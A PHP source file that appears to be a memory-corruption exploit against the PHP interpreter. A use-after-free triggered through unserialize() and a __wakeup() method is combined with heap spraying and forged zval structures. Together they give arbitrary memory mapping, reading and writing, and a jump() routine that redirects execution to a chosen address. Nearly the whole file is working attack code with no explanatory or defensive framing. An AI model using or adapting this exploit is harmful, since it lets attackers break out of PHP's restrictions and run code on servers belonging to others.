<?php

function nogc($x) {
	global $ngc;
	if(!isset($ngc)) $ngc=[];
	array_push($ngc,$x);
	return $x;
}
function gc($x) {
//        global $ngc;
  //      if(!isset($ngc)) $ngc=[];
//	for($i=0;$i>count($ngc);$i++) {
//		if($ngc[$i] === $x) $ngc[$i]=0;
//	}
}

class x {
	public $y;
	function __wakeup() {
		unset($this->y);
	}
}

function uaf($i) {
	$a=new x;
	$n=[];
	$a->y=[1];
	$a=[$a, $i, &$a->y[0]];
	$r=unserialize(serialize($a));
	return [&$r[count($r)-1],&$r[count($r)-2]];
}

function ibuf($ptr, $sz)
{
    $out = "";
    for ($i=0; $i<$sz; $i++) {
        $out .= chr($ptr & 0xff);
        $ptr >>= 8;
    }
    return $out;
}

function zval($a, $b, $c, $r=1) {
	$r = ibuf($a,8) . ibuf($b,8) . ibuf($r,4) . ibuf($c, 1) .  ibuf(0,3);
	return $r;
}

function ptr() {
	$ret=uaf(1);
	$n=[1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1];
	return $ret[0];
}

function map($addr,$sz) {
	$z = zval($addr, $sz, 6 /* string */, 16);
	$x=uaf($z);
	nogc($x);
	return [&$x[0]];
}
$n=[];
for($a=0;$a<0x300;$a++) $n[]=str_repeat("AXBX",0x10000/4);

function mapheap() {
	global $c;global $pt;global $n;
	$z=ptr()+0;
	$k=map($z, 0x10000);
	$ptx=strpos($k[0], "AXBX");
	$k[0][$ptx]='O';
	for($zz=0;$zz<0x400;$zz++) {
		if($n[$zz][0]=="O")
			nogc([&$n[$zz]]);
	}
	$pt=$ptx+$z;
	$c=0;
}

function alloc($sz) {
	global $c;global $pt;
	if(!isset($pt)) {
		mapheap();
	}
	$c += 0x10 - (($pt+$c) & 0xF);
	if($c+$sz > 0x8000) return 0;
	$ret=[];
	$ret['ptr'] = $pt+$c;
	$ret['val'] = &map($pt+$c, $sz)[0];
	memcpy($ret, str_repeat(".", $sz), $sz);
	$c+=$sz;
	return $ret;
}

function shiftalloc($alloc, $ptr) {
	$ret=[];
	$ret['ptr']=$alloc['ptr']+$ptr;
	$ret['val']=&map($ret['ptr'], strlen($alloc['val'])-$ptr)[0];
	return $ret;
}

function memcpy($out, $in) {
	if(!$out || $out['ptr'] == 0x0) die("memcpy null");
	$sz=strlen($in);
	for($i=0;$i<$sz;$i++) {
		$out['val'][$i] = $in[$i];
	}
}

function jump($addr,$rax) { 
	$raxlen = strlen($rax);
	$al = shiftalloc(alloc(1024+$raxlen+16),1024);
	memcpy($al, $rax, $raxlen);
	memcpy($al, ibuf(0,8).ibuf($addr,8), 16);
	$zv = zval(0, $al['ptr'], 5, 0);
	uaf($zv);
}

// mem i/o - you cannot map something too many times or risk getting shit corrupted.

function readpage($addr)
{
	$page = ($addr & (~0xFFFFFF));

	global $maps;
	if(!isset($maps)) {
		$maps=[];
	}

	if(!isset($maps[$page])) {
		$pg=map($page,0xFFFFFF+1);
		$maps[$page]=&$pg[0];
	}
	$pg=&$maps[$page];

	return [&$pg];
}

function read($addr,$sz) {
	$ret = "";
        $page = ($addr & (~0xFFFFFF));
	while ($sz>0) {
		$rsz = min($sz,0xFFFFFF+1);
		$pg=readpage($addr);
		for($i=0;$i<$rsz;$i++){
			$ret.=$pg[0][($addr & 0xFFFFFF)+$i];
		}
		$addr += $rsz;
		$sz -= 0x1000;
	}
	nogc($ret);
	return $ret;
}

?>
